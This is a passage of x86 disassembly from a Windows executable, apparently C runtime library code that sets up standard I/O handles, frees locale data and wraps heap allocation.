  4070b5:	e8 36 ab ff ff       	call   0x401bf0
  4070ba:	c3                   	ret
  4070bb:	33 f6                	xor    %esi,%esi
  4070bd:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  4070c0:	6a 07                	push   $0x7
  4070c2:	e8 1b fa ff ff       	call   0x406ae2
  4070c7:	59                   	pop    %ecx
  4070c8:	89 75 fc             	mov    %esi,-0x4(%ebp)
  4070cb:	8b fe                	mov    %esi,%edi
  4070cd:	a1 90 51 41 00       	mov    0x415190,%eax
  4070d2:	89 7d e0             	mov    %edi,-0x20(%ebp)
  4070d5:	39 45 08             	cmp    %eax,0x8(%ebp)
  4070d8:	7c 1f                	jl     0x4070f9
  4070da:	39 34 bd 90 4f 41 00 	cmp    %esi,0x414f90(,%edi,4)
  4070e1:	75 31                	jne    0x407114
  4070e3:	e8 f4 fe ff ff       	call   0x406fdc
  4070e8:	89 04 bd 90 4f 41 00 	mov    %eax,0x414f90(,%edi,4)
  4070ef:	85 c0                	test   %eax,%eax
  4070f1:	75 14                	jne    0x407107
  4070f3:	6a 0c                	push   $0xc
  4070f5:	5e                   	pop    %esi
  4070f6:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  4070f9:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  407100:	e8 15 00 00 00       	call   0x40711a
  407105:	eb ac                	jmp    0x4070b3
  407107:	a1 90 51 41 00       	mov    0x415190,%eax
  40710c:	83 c0 40             	add    $0x40,%eax
  40710f:	a3 90 51 41 00       	mov    %eax,0x415190
  407114:	47                   	inc    %edi
  407115:	eb bb                	jmp    0x4070d2
  407117:	8b 75 e4             	mov    -0x1c(%ebp),%esi
  40711a:	6a 07                	push   $0x7
  40711c:	e8 09 fa ff ff       	call   0x406b2a
  407121:	59                   	pop    %ecx
  407122:	c3                   	ret
  407123:	8b ff                	mov    %edi,%edi
  407125:	55                   	push   %ebp
  407126:	8b ec                	mov    %esp,%ebp
  407128:	8b 45 08             	mov    0x8(%ebp),%eax
  40712b:	8b c8                	mov    %eax,%ecx
  40712d:	83 e0 3f             	and    $0x3f,%eax
  407130:	c1 f9 06             	sar    $0x6,%ecx
  407133:	6b c0 30             	imul   $0x30,%eax,%eax
  407136:	03 04 8d 90 4f 41 00 	add    0x414f90(,%ecx,4),%eax
  40713d:	50                   	push   %eax
  40713e:	ff 15 80 d0 40 00    	call   *0x40d080
  407144:	5d                   	pop    %ebp
  407145:	c3                   	ret
  407146:	8b ff                	mov    %edi,%edi
  407148:	55                   	push   %ebp
  407149:	8b ec                	mov    %esp,%ebp
  40714b:	8b 45 08             	mov    0x8(%ebp),%eax
  40714e:	8b c8                	mov    %eax,%ecx
  407150:	83 e0 3f             	and    $0x3f,%eax
  407153:	c1 f9 06             	sar    $0x6,%ecx
  407156:	6b c0 30             	imul   $0x30,%eax,%eax
  407159:	03 04 8d 90 4f 41 00 	add    0x414f90(,%ecx,4),%eax
  407160:	50                   	push   %eax
  407161:	ff 15 84 d0 40 00    	call   *0x40d084
  407167:	5d                   	pop    %ebp
  407168:	c3                   	ret
  407169:	8b ff                	mov    %edi,%edi
  40716b:	55                   	push   %ebp
  40716c:	8b ec                	mov    %esp,%ebp
  40716e:	53                   	push   %ebx
  40716f:	56                   	push   %esi
  407170:	8b 75 08             	mov    0x8(%ebp),%esi
  407173:	57                   	push   %edi
  407174:	85 f6                	test   %esi,%esi
  407176:	78 67                	js     0x4071df
  407178:	3b 35 90 51 41 00    	cmp    0x415190,%esi
  40717e:	73 5f                	jae    0x4071df
  407180:	8b c6                	mov    %esi,%eax
  407182:	8b fe                	mov    %esi,%edi
  407184:	83 e0 3f             	and    $0x3f,%eax
  407187:	c1 ff 06             	sar    $0x6,%edi
  40718a:	6b d8 30             	imul   $0x30,%eax,%ebx
  40718d:	8b 04 bd 90 4f 41 00 	mov    0x414f90(,%edi,4),%eax
  407194:	f6 44 03 28 01       	testb  $0x1,0x28(%ebx,%eax,1)
  407199:	74 44                	je     0x4071df
  40719b:	83 7c 03 18 ff       	cmpl   $0xffffffff,0x18(%ebx,%eax,1)
  4071a0:	74 3d                	je     0x4071df
  4071a2:	e8 bc d0 ff ff       	call   0x404263
  4071a7:	83 f8 01             	cmp    $0x1,%eax
  4071aa:	75 23                	jne    0x4071cf
  4071ac:	33 c0                	xor    %eax,%eax
  4071ae:	2b f0                	sub    %eax,%esi
  4071b0:	74 14                	je     0x4071c6
  4071b2:	83 ee 01             	sub    $0x1,%esi
  4071b5:	74 0a                	je     0x4071c1
  4071b7:	83 ee 01             	sub    $0x1,%esi
  4071ba:	75 13                	jne    0x4071cf
  4071bc:	50                   	push   %eax
  4071bd:	6a f4                	push   $0xfffffff4
  4071bf:	eb 08                	jmp    0x4071c9
  4071c1:	50                   	push   %eax
  4071c2:	6a f5                	push   $0xfffffff5
  4071c4:	eb 03                	jmp    0x4071c9
  4071c6:	50                   	push   %eax
  4071c7:	6a f6                	push   $0xfffffff6
  4071c9:	ff 15 04 d1 40 00    	call   *0x40d104
  4071cf:	8b 04 bd 90 4f 41 00 	mov    0x414f90(,%edi,4),%eax
  4071d6:	83 4c 03 18 ff       	orl    $0xffffffff,0x18(%ebx,%eax,1)
  4071db:	33 c0                	xor    %eax,%eax
  4071dd:	eb 16                	jmp    0x4071f5
  4071df:	e8 15 ea ff ff       	call   0x405bf9
  4071e4:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  4071ea:	e8 f7 e9 ff ff       	call   0x405be6
  4071ef:	83 20 00             	andl   $0x0,(%eax)
  4071f2:	83 c8 ff             	or     $0xffffffff,%eax
  4071f5:	5f                   	pop    %edi
  4071f6:	5e                   	pop    %esi
  4071f7:	5b                   	pop    %ebx
  4071f8:	5d                   	pop    %ebp
  4071f9:	c3                   	ret
  4071fa:	8b ff                	mov    %edi,%edi
  4071fc:	55                   	push   %ebp
  4071fd:	8b ec                	mov    %esp,%ebp
  4071ff:	8b 4d 08             	mov    0x8(%ebp),%ecx
  407202:	83 f9 fe             	cmp    $0xfffffffe,%ecx
  407205:	75 15                	jne    0x40721c
  407207:	e8 da e9 ff ff       	call   0x405be6
  40720c:	83 20 00             	andl   $0x0,(%eax)
  40720f:	e8 e5 e9 ff ff       	call   0x405bf9
  407214:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  40721a:	eb 43                	jmp    0x40725f
  40721c:	85 c9                	test   %ecx,%ecx
  40721e:	78 27                	js     0x407247
  407220:	3b 0d 90 51 41 00    	cmp    0x415190,%ecx
  407226:	73 1f                	jae    0x407247
  407228:	8b c1                	mov    %ecx,%eax
  40722a:	83 e1 3f             	and    $0x3f,%ecx
  40722d:	c1 f8 06             	sar    $0x6,%eax
  407230:	6b c9 30             	imul   $0x30,%ecx,%ecx
  407233:	8b 04 85 90 4f 41 00 	mov    0x414f90(,%eax,4),%eax
  40723a:	f6 44 08 28 01       	testb  $0x1,0x28(%eax,%ecx,1)
  40723f:	74 06                	je     0x407247
  407241:	8b 44 08 18          	mov    0x18(%eax,%ecx,1),%eax
  407245:	5d                   	pop    %ebp
  407246:	c3                   	ret
  407247:	e8 9a e9 ff ff       	call   0x405be6
  40724c:	83 20 00             	andl   $0x0,(%eax)
  40724f:	e8 a5 e9 ff ff       	call   0x405bf9
  407254:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  40725a:	e8 de e8 ff ff       	call   0x405b3d
  40725f:	83 c8 ff             	or     $0xffffffff,%eax
  407262:	5d                   	pop    %ebp
  407263:	c3                   	ret
  407264:	8b ff                	mov    %edi,%edi
  407266:	55                   	push   %ebp
  407267:	8b ec                	mov    %esp,%ebp
  407269:	83 ec 48             	sub    $0x48,%esp
  40726c:	8d 45 b8             	lea    -0x48(%ebp),%eax
  40726f:	50                   	push   %eax
  407270:	ff 15 68 d0 40 00    	call   *0x40d068
  407276:	66 83 7d ea 00       	cmpw   $0x0,-0x16(%ebp)
  40727b:	0f 84 95 00 00 00    	je     0x407316
  407281:	8b 45 ec             	mov    -0x14(%ebp),%eax
  407284:	85 c0                	test   %eax,%eax
  407286:	0f 84 8a 00 00 00    	je     0x407316
  40728c:	53                   	push   %ebx
  40728d:	56                   	push   %esi
  40728e:	8b 30                	mov    (%eax),%esi
  407290:	8d 58 04             	lea    0x4(%eax),%ebx
  407293:	8d 04 33             	lea    (%ebx,%esi,1),%eax
  407296:	89 45 fc             	mov    %eax,-0x4(%ebp)
  407299:	b8 00 20 00 00       	mov    $0x2000,%eax
  40729e:	3b f0                	cmp    %eax,%esi
  4072a0:	7c 02                	jl     0x4072a4
  4072a2:	8b f0                	mov    %eax,%esi
  4072a4:	56                   	push   %esi
  4072a5:	e8 e1 fd ff ff       	call   0x40708b
  4072aa:	a1 90 51 41 00       	mov    0x415190,%eax
  4072af:	59                   	pop    %ecx
  4072b0:	3b f0                	cmp    %eax,%esi
  4072b2:	7e 02                	jle    0x4072b6
  4072b4:	8b f0                	mov    %eax,%esi
  4072b6:	57                   	push   %edi
  4072b7:	33 ff                	xor    %edi,%edi
  4072b9:	85 f6                	test   %esi,%esi
  4072bb:	74 56                	je     0x407313
  4072bd:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4072c0:	8b 08                	mov    (%eax),%ecx
  4072c2:	83 f9 ff             	cmp    $0xffffffff,%ecx
  4072c5:	74 40                	je     0x407307
  4072c7:	83 f9 fe             	cmp    $0xfffffffe,%ecx
  4072ca:	74 3b                	je     0x407307
  4072cc:	8a 13                	mov    (%ebx),%dl
  4072ce:	f6 c2 01             	test   $0x1,%dl
  4072d1:	74 34                	je     0x407307
  4072d3:	f6 c2 08             	test   $0x8,%dl
  4072d6:	75 0b                	jne    0x4072e3
  4072d8:	51                   	push   %ecx
  4072d9:	ff 15 08 d1 40 00    	call   *0x40d108
  4072df:	85 c0                	test   %eax,%eax
  4072e1:	74 21                	je     0x407304
  4072e3:	8b c7                	mov    %edi,%eax
  4072e5:	8b cf                	mov    %edi,%ecx
  4072e7:	83 e0 3f             	and    $0x3f,%eax
  4072ea:	c1 f9 06             	sar    $0x6,%ecx
  4072ed:	6b d0 30             	imul   $0x30,%eax,%edx
  4072f0:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4072f3:	03 14 8d 90 4f 41 00 	add    0x414f90(,%ecx,4),%edx
  4072fa:	8b 00                	mov    (%eax),%eax
  4072fc:	89 42 18             	mov    %eax,0x18(%edx)
  4072ff:	8a 03                	mov    (%ebx),%al
  407301:	88 42 28             	mov    %al,0x28(%edx)
  407304:	8b 45 fc             	mov    -0x4(%ebp),%eax
  407307:	47                   	inc    %edi
  407308:	83 c0 04             	add    $0x4,%eax
  40730b:	43                   	inc    %ebx
  40730c:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40730f:	3b fe                	cmp    %esi,%edi
  407311:	75 ad                	jne    0x4072c0
  407313:	5f                   	pop    %edi
  407314:	5e                   	pop    %esi
  407315:	5b                   	pop    %ebx
  407316:	8b e5                	mov    %ebp,%esp
  407318:	5d                   	pop    %ebp
  407319:	c3                   	ret
  40731a:	8b ff                	mov    %edi,%edi
  40731c:	53                   	push   %ebx
  40731d:	56                   	push   %esi
  40731e:	57                   	push   %edi
  40731f:	33 ff                	xor    %edi,%edi
  407321:	8b c7                	mov    %edi,%eax
  407323:	8b cf                	mov    %edi,%ecx
  407325:	83 e0 3f             	and    $0x3f,%eax
  407328:	c1 f9 06             	sar    $0x6,%ecx
  40732b:	6b f0 30             	imul   $0x30,%eax,%esi
  40732e:	03 34 8d 90 4f 41 00 	add    0x414f90(,%ecx,4),%esi
  407335:	83 7e 18 ff          	cmpl   $0xffffffff,0x18(%esi)
  407339:	74 0c                	je     0x407347
  40733b:	83 7e 18 fe          	cmpl   $0xfffffffe,0x18(%esi)
  40733f:	74 06                	je     0x407347
  407341:	80 4e 28 80          	orb    $0x80,0x28(%esi)
  407345:	eb 7b                	jmp    0x4073c2
  407347:	8b c7                	mov    %edi,%eax
  407349:	c6 46 28 81          	movb   $0x81,0x28(%esi)
  40734d:	83 e8 00             	sub    $0x0,%eax
  407350:	74 10                	je     0x407362
  407352:	83 e8 01             	sub    $0x1,%eax
  407355:	74 07                	je     0x40735e
  407357:	6a f4                	push   $0xfffffff4
  407359:	83 e8 01             	sub    $0x1,%eax
  40735c:	eb 06                	jmp    0x407364
  40735e:	6a f5                	push   $0xfffffff5
  407360:	eb 02                	jmp    0x407364
  407362:	6a f6                	push   $0xfffffff6
  407364:	58                   	pop    %eax
  407365:	50                   	push   %eax
  407366:	ff 15 ac d0 40 00    	call   *0x40d0ac
  40736c:	8b d8                	mov    %eax,%ebx
  40736e:	83 fb ff             	cmp    $0xffffffff,%ebx
  407371:	74 0d                	je     0x407380
  407373:	85 db                	test   %ebx,%ebx
  407375:	74 09                	je     0x407380
  407377:	53                   	push   %ebx
  407378:	ff 15 08 d1 40 00    	call   *0x40d108
  40737e:	eb 02                	jmp    0x407382
  407380:	33 c0                	xor    %eax,%eax
  407382:	85 c0                	test   %eax,%eax
  407384:	74 1e                	je     0x4073a4
  407386:	25 ff 00 00 00       	and    $0xff,%eax
  40738b:	89 5e 18             	mov    %ebx,0x18(%esi)
  40738e:	83 f8 02             	cmp    $0x2,%eax
  407391:	75 06                	jne    0x407399
  407393:	80 4e 28 40          	orb    $0x40,0x28(%esi)
  407397:	eb 29                	jmp    0x4073c2
  407399:	83 f8 03             	cmp    $0x3,%eax
  40739c:	75 24                	jne    0x4073c2
  40739e:	80 4e 28 08          	orb    $0x8,0x28(%esi)
  4073a2:	eb 1e                	jmp    0x4073c2
  4073a4:	80 4e 28 40          	orb    $0x40,0x28(%esi)
  4073a8:	c7 46 18 fe ff ff ff 	movl   $0xfffffffe,0x18(%esi)
  4073af:	a1 c4 51 41 00       	mov    0x4151c4,%eax
  4073b4:	85 c0                	test   %eax,%eax
  4073b6:	74 0a                	je     0x4073c2
  4073b8:	8b 04 b8             	mov    (%eax,%edi,4),%eax
  4073bb:	c7 40 10 fe ff ff ff 	movl   $0xfffffffe,0x10(%eax)
  4073c2:	47                   	inc    %edi
  4073c3:	83 ff 03             	cmp    $0x3,%edi
  4073c6:	0f 85 55 ff ff ff    	jne    0x407321
  4073cc:	5f                   	pop    %edi
  4073cd:	5e                   	pop    %esi
  4073ce:	5b                   	pop    %ebx
  4073cf:	c3                   	ret
  4073d0:	6a 0c                	push   $0xc
  4073d2:	68 20 28 41 00       	push   $0x412820
  4073d7:	e8 c4 a7 ff ff       	call   0x401ba0
  4073dc:	6a 07                	push   $0x7
  4073de:	e8 ff f6 ff ff       	call   0x406ae2
  4073e3:	59                   	pop    %ecx
  4073e4:	33 db                	xor    %ebx,%ebx
  4073e6:	88 5d e7             	mov    %bl,-0x19(%ebp)
  4073e9:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  4073ec:	53                   	push   %ebx
  4073ed:	e8 99 fc ff ff       	call   0x40708b
  4073f2:	59                   	pop    %ecx
  4073f3:	85 c0                	test   %eax,%eax
  4073f5:	75 0f                	jne    0x407406
  4073f7:	e8 68 fe ff ff       	call   0x407264
  4073fc:	e8 19 ff ff ff       	call   0x40731a
  407401:	b3 01                	mov    $0x1,%bl
  407403:	88 5d e7             	mov    %bl,-0x19(%ebp)
  407406:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  40740d:	e8 0b 00 00 00       	call   0x40741d
  407412:	8a c3                	mov    %bl,%al
  407414:	e8 d7 a7 ff ff       	call   0x401bf0
  407419:	c3                   	ret
  40741a:	8a 5d e7             	mov    -0x19(%ebp),%bl
  40741d:	6a 07                	push   $0x7
  40741f:	e8 06 f7 ff ff       	call   0x406b2a
  407424:	59                   	pop    %ecx
  407425:	c3                   	ret
  407426:	8b ff                	mov    %edi,%edi
  407428:	56                   	push   %esi
  407429:	33 f6                	xor    %esi,%esi
  40742b:	8b 86 90 4f 41 00    	mov    0x414f90(%esi),%eax
  407431:	85 c0                	test   %eax,%eax
  407433:	74 0e                	je     0x407443
  407435:	50                   	push   %eax
  407436:	e8 1b fc ff ff       	call   0x407056
  40743b:	83 a6 90 4f 41 00 00 	andl   $0x0,0x414f90(%esi)
  407442:	59                   	pop    %ecx
  407443:	83 c6 04             	add    $0x4,%esi
  407446:	81 fe 00 02 00 00    	cmp    $0x200,%esi
  40744c:	72 dd                	jb     0x40742b
  40744e:	b0 01                	mov    $0x1,%al
  407450:	5e                   	pop    %esi
  407451:	c3                   	ret
  407452:	8b ff                	mov    %edi,%edi
  407454:	55                   	push   %ebp
  407455:	8b ec                	mov    %esp,%ebp
  407457:	51                   	push   %ecx
  407458:	e8 c7 e3 ff ff       	call   0x405824
  40745d:	8b 48 4c             	mov    0x4c(%eax),%ecx
  407460:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  407463:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  407466:	51                   	push   %ecx
  407467:	50                   	push   %eax
  407468:	e8 64 12 00 00       	call   0x4086d1
  40746d:	8b 45 fc             	mov    -0x4(%ebp),%eax
  407470:	59                   	pop    %ecx
  407471:	59                   	pop    %ecx
  407472:	8b 00                	mov    (%eax),%eax
  407474:	8b e5                	mov    %ebp,%esp
  407476:	5d                   	pop    %ebp
  407477:	c3                   	ret
  407478:	8b ff                	mov    %edi,%edi
  40747a:	55                   	push   %ebp
  40747b:	8b ec                	mov    %esp,%ebp
  40747d:	56                   	push   %esi
  40747e:	8b 75 08             	mov    0x8(%ebp),%esi
  407481:	85 f6                	test   %esi,%esi
  407483:	0f 84 ea 00 00 00    	je     0x407573
  407489:	8b 46 0c             	mov    0xc(%esi),%eax
  40748c:	3b 05 5c 46 41 00    	cmp    0x41465c,%eax
  407492:	74 07                	je     0x40749b
  407494:	50                   	push   %eax
  407495:	e8 cf e7 ff ff       	call   0x405c69
  40749a:	59                   	pop    %ecx
  40749b:	8b 46 10             	mov    0x10(%esi),%eax
  40749e:	3b 05 60 46 41 00    	cmp    0x414660,%eax
  4074a4:	74 07                	je     0x4074ad
  4074a6:	50                   	push   %eax
  4074a7:	e8 bd e7 ff ff       	call   0x405c69
  4074ac:	59                   	pop    %ecx
  4074ad:	8b 46 14             	mov    0x14(%esi),%eax
  4074b0:	3b 05 64 46 41 00    	cmp    0x414664,%eax
  4074b6:	74 07                	je     0x4074bf
  4074b8:	50                   	push   %eax
  4074b9:	e8 ab e7 ff ff       	call   0x405c69
  4074be:	59                   	pop    %ecx
  4074bf:	8b 46 18             	mov    0x18(%esi),%eax
  4074c2:	3b 05 68 46 41 00    	cmp    0x414668,%eax
  4074c8:	74 07                	je     0x4074d1
  4074ca:	50                   	push   %eax
  4074cb:	e8 99 e7 ff ff       	call   0x405c69
  4074d0:	59                   	pop    %ecx
  4074d1:	8b 46 1c             	mov    0x1c(%esi),%eax
  4074d4:	3b 05 6c 46 41 00    	cmp    0x41466c,%eax
  4074da:	74 07                	je     0x4074e3
  4074dc:	50                   	push   %eax
  4074dd:	e8 87 e7 ff ff       	call   0x405c69
  4074e2:	59                   	pop    %ecx
  4074e3:	8b 46 20             	mov    0x20(%esi),%eax
  4074e6:	3b 05 70 46 41 00    	cmp    0x414670,%eax
  4074ec:	74 07                	je     0x4074f5
  4074ee:	50                   	push   %eax
  4074ef:	e8 75 e7 ff ff       	call   0x405c69
  4074f4:	59                   	pop    %ecx
  4074f5:	8b 46 24             	mov    0x24(%esi),%eax
  4074f8:	3b 05 74 46 41 00    	cmp    0x414674,%eax
  4074fe:	74 07                	je     0x407507
  407500:	50                   	push   %eax
  407501:	e8 63 e7 ff ff       	call   0x405c69
  407506:	59                   	pop    %ecx
  407507:	8b 46 38             	mov    0x38(%esi),%eax
  40750a:	3b 05 88 46 41 00    	cmp    0x414688,%eax
  407510:	74 07                	je     0x407519
  407512:	50                   	push   %eax
  407513:	e8 51 e7 ff ff       	call   0x405c69
  407518:	59                   	pop    %ecx
  407519:	8b 46 3c             	mov    0x3c(%esi),%eax
  40751c:	3b 05 8c 46 41 00    	cmp    0x41468c,%eax
  407522:	74 07                	je     0x40752b
  407524:	50                   	push   %eax
  407525:	e8 3f e7 ff ff       	call   0x405c69
  40752a:	59                   	pop    %ecx
  40752b:	8b 46 40             	mov    0x40(%esi),%eax
  40752e:	3b 05 90 46 41 00    	cmp    0x414690,%eax
  407534:	74 07                	je     0x40753d
  407536:	50                   	push   %eax
  407537:	e8 2d e7 ff ff       	call   0x405c69
  40753c:	59                   	pop    %ecx
  40753d:	8b 46 44             	mov    0x44(%esi),%eax
  407540:	3b 05 94 46 41 00    	cmp    0x414694,%eax
  407546:	74 07                	je     0x40754f
  407548:	50                   	push   %eax
  407549:	e8 1b e7 ff ff       	call   0x405c69
  40754e:	59                   	pop    %ecx
  40754f:	8b 46 48             	mov    0x48(%esi),%eax
  407552:	3b 05 98 46 41 00    	cmp    0x414698,%eax
  407558:	74 07                	je     0x407561
  40755a:	50                   	push   %eax
  40755b:	e8 09 e7 ff ff       	call   0x405c69
  407560:	59                   	pop    %ecx
  407561:	8b 46 4c             	mov    0x4c(%esi),%eax
  407564:	3b 05 9c 46 41 00    	cmp    0x41469c,%eax
  40756a:	74 07                	je     0x407573
  40756c:	50                   	push   %eax
  40756d:	e8 f7 e6 ff ff       	call   0x405c69
  407572:	59                   	pop    %ecx
  407573:	5e                   	pop    %esi
  407574:	5d                   	pop    %ebp
  407575:	c3                   	ret
  407576:	8b ff                	mov    %edi,%edi
  407578:	55                   	push   %ebp
  407579:	8b ec                	mov    %esp,%ebp
  40757b:	56                   	push   %esi
  40757c:	8b 75 08             	mov    0x8(%ebp),%esi
  40757f:	85 f6                	test   %esi,%esi
  407581:	74 59                	je     0x4075dc
  407583:	8b 06                	mov    (%esi),%eax
  407585:	3b 05 50 46 41 00    	cmp    0x414650,%eax
  40758b:	74 07                	je     0x407594
  40758d:	50                   	push   %eax
  40758e:	e8 d6 e6 ff ff       	call   0x405c69
  407593:	59                   	pop    %ecx
  407594:	8b 46 04             	mov    0x4(%esi),%eax
  407597:	3b 05 54 46 41 00    	cmp    0x414654,%eax
  40759d:	74 07                	je     0x4075a6
  40759f:	50                   	push   %eax
  4075a0:	e8 c4 e6 ff ff       	call   0x405c69
  4075a5:	59                   	pop    %ecx
  4075a6:	8b 46 08             	mov    0x8(%esi),%eax
  4075a9:	3b 05 58 46 41 00    	cmp    0x414658,%eax
  4075af:	74 07                	je     0x4075b8
  4075b1:	50                   	push   %eax
  4075b2:	e8 b2 e6 ff ff       	call   0x405c69
  4075b7:	59                   	pop    %ecx
  4075b8:	8b 46 30             	mov    0x30(%esi),%eax
  4075bb:	3b 05 80 46 41 00    	cmp    0x414680,%eax
  4075c1:	74 07                	je     0x4075ca
  4075c3:	50                   	push   %eax
  4075c4:	e8 a0 e6 ff ff       	call   0x405c69
  4075c9:	59                   	pop    %ecx
  4075ca:	8b 46 34             	mov    0x34(%esi),%eax
  4075cd:	3b 05 84 46 41 00    	cmp    0x414684,%eax
  4075d3:	74 07                	je     0x4075dc
  4075d5:	50                   	push   %eax
  4075d6:	e8 8e e6 ff ff       	call   0x405c69
  4075db:	59                   	pop    %ecx
  4075dc:	5e                   	pop    %esi
  4075dd:	5d                   	pop    %ebp
  4075de:	c3                   	ret
  4075df:	8b ff                	mov    %edi,%edi
  4075e1:	55                   	push   %ebp
  4075e2:	8b ec                	mov    %esp,%ebp
  4075e4:	8b 45 0c             	mov    0xc(%ebp),%eax
  4075e7:	53                   	push   %ebx
  4075e8:	56                   	push   %esi
  4075e9:	8b 75 08             	mov    0x8(%ebp),%esi
  4075ec:	57                   	push   %edi
  4075ed:	33 ff                	xor    %edi,%edi
  4075ef:	8d 04 86             	lea    (%esi,%eax,4),%eax
  4075f2:	8b c8                	mov    %eax,%ecx
  4075f4:	2b ce                	sub    %esi,%ecx
  4075f6:	83 c1 03             	add    $0x3,%ecx
  4075f9:	c1 e9 02             	shr    $0x2,%ecx
  4075fc:	3b c6                	cmp    %esi,%eax
  4075fe:	1b db                	sbb    %ebx,%ebx
  407600:	f7 d3                	not    %ebx
  407602:	23 d9                	and    %ecx,%ebx
  407604:	74 10                	je     0x407616
  407606:	ff 36                	push   (%esi)
  407608:	e8 5c e6 ff ff       	call   0x405c69
  40760d:	47                   	inc    %edi
  40760e:	8d 76 04             	lea    0x4(%esi),%esi
  407611:	59                   	pop    %ecx
  407612:	3b fb                	cmp    %ebx,%edi
  407614:	75 f0                	jne    0x407606
  407616:	5f                   	pop    %edi
  407617:	5e                   	pop    %esi
  407618:	5b                   	pop    %ebx
  407619:	5d                   	pop    %ebp
  40761a:	c3                   	ret
  40761b:	8b ff                	mov    %edi,%edi
  40761d:	55                   	push   %ebp
  40761e:	8b ec                	mov    %esp,%ebp
  407620:	56                   	push   %esi
  407621:	8b 75 08             	mov    0x8(%ebp),%esi
  407624:	85 f6                	test   %esi,%esi
  407626:	0f 84 d0 00 00 00    	je     0x4076fc
  40762c:	6a 07                	push   $0x7
  40762e:	56                   	push   %esi
  40762f:	e8 ab ff ff ff       	call   0x4075df
  407634:	8d 46 1c             	lea    0x1c(%esi),%eax
  407637:	6a 07                	push   $0x7
  407639:	50                   	push   %eax
  40763a:	e8 a0 ff ff ff       	call   0x4075df
  40763f:	8d 46 38             	lea    0x38(%esi),%eax
  407642:	6a 0c                	push   $0xc
  407644:	50                   	push   %eax
  407645:	e8 95 ff ff ff       	call   0x4075df
  40764a:	8d 46 68             	lea    0x68(%esi),%eax
  40764d:	6a 0c                	push   $0xc
  40764f:	50                   	push   %eax
  407650:	e8 8a ff ff ff       	call   0x4075df
  407655:	8d 86 98 00 00 00    	lea    0x98(%esi),%eax
  40765b:	6a 02                	push   $0x2
  40765d:	50                   	push   %eax
  40765e:	e8 7c ff ff ff       	call   0x4075df
  407663:	ff b6 a0 00 00 00    	push   0xa0(%esi)
  407669:	e8 fb e5 ff ff       	call   0x405c69
  40766e:	ff b6 a4 00 00 00    	push   0xa4(%esi)
  407674:	e8 f0 e5 ff ff       	call   0x405c69
  407679:	ff b6 a8 00 00 00    	push   0xa8(%esi)
  40767f:	e8 e5 e5 ff ff       	call   0x405c69
  407684:	8d 86 b4 00 00 00    	lea    0xb4(%esi),%eax
  40768a:	6a 07                	push   $0x7
  40768c:	50                   	push   %eax
  40768d:	e8 4d ff ff ff       	call   0x4075df
  407692:	8d 86 d0 00 00 00    	lea    0xd0(%esi),%eax
  407698:	6a 07                	push   $0x7
  40769a:	50                   	push   %eax
  40769b:	e8 3f ff ff ff       	call   0x4075df
  4076a0:	83 c4 44             	add    $0x44,%esp
  4076a3:	8d 86 ec 00 00 00    	lea    0xec(%esi),%eax
  4076a9:	6a 0c                	push   $0xc
  4076ab:	50                   	push   %eax
  4076ac:	e8 2e ff ff ff       	call   0x4075df
  4076b1:	8d 86 1c 01 00 00    	lea    0x11c(%esi),%eax
  4076b7:	6a 0c                	push   $0xc
  4076b9:	50                   	push   %eax
  4076ba:	e8 20 ff ff ff       	call   0x4075df
  4076bf:	8d 86 4c 01 00 00    	lea    0x14c(%esi),%eax
  4076c5:	6a 02                	push   $0x2
  4076c7:	50                   	push   %eax
  4076c8:	e8 12 ff ff ff       	call   0x4075df
  4076cd:	ff b6 54 01 00 00    	push   0x154(%esi)
  4076d3:	e8 91 e5 ff ff       	call   0x405c69
  4076d8:	ff b6 58 01 00 00    	push   0x158(%esi)
  4076de:	e8 86 e5 ff ff       	call   0x405c69
  4076e3:	ff b6 5c 01 00 00    	push   0x15c(%esi)
  4076e9:	e8 7b e5 ff ff       	call   0x405c69
  4076ee:	ff b6 60 01 00 00    	push   0x160(%esi)
  4076f4:	e8 70 e5 ff ff       	call   0x405c69
  4076f9:	83 c4 28             	add    $0x28,%esp
  4076fc:	5e                   	pop    %esi
  4076fd:	5d                   	pop    %ebp
  4076fe:	c3                   	ret
  4076ff:	8b ff                	mov    %edi,%edi
  407701:	55                   	push   %ebp
  407702:	8b ec                	mov    %esp,%ebp
  407704:	56                   	push   %esi
  407705:	8b 75 08             	mov    0x8(%ebp),%esi
  407708:	83 fe e0             	cmp    $0xffffffe0,%esi
  40770b:	77 30                	ja     0x40773d
  40770d:	85 f6                	test   %esi,%esi
  40770f:	75 17                	jne    0x407728
  407711:	46                   	inc    %esi
  407712:	eb 14                	jmp    0x407728
  407714:	e8 da d5 ff ff       	call   0x404cf3
  407719:	85 c0                	test   %eax,%eax
  40771b:	74 20                	je     0x40773d
  40771d:	56                   	push   %esi
  40771e:	e8 6f 06 00 00       	call   0x407d92
  407723:	59                   	pop    %ecx
  407724:	85 c0                	test   %eax,%eax
  407726:	74 15                	je     0x40773d
  407728:	56                   	push   %esi
  407729:	6a 00                	push   $0x0
  40772b:	ff 35 a0 51 41 00    	push   0x4151a0
  407731:	ff 15 d0 d0 40 00    	call   *0x40d0d0
  407737:	85 c0                	test   %eax,%eax
  407739:	74 d9                	je     0x407714
  40773b:	eb 0d                	jmp    0x40774a
  40773d:	e8 b7 e4 ff ff       	call   0x405bf9
  407742:	c7 00 0c 00 00 00    	movl   $0xc,(%eax)
  407748:	33 c0                	xor    %eax,%eax
  40774a:	5e                   	pop    %esi
  40774b:	5d                   	pop    %ebp
  40774c:	c3                   	ret
  40774d:	8b ff                	mov    %edi,%edi
  40774f:	55                   	push   %ebp
  407750:	8b ec                	mov    %esp,%ebp
  407752:	83 ec 18             	sub    $0x18,%esp
  407755:	a1 00 40 41 00       	mov    0x414000,%eax
  40775a:	33 c5                	xor    %ebp,%eax
  40775c:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40775f:	53                   	push   %ebx
  407760:	56                   	push   %esi
  407761:	57                   	push   %edi
  407762:	ff 75 08             	push   0x8(%ebp)
  407765:	8d 4d e8             	lea    -0x18(%ebp),%ecx
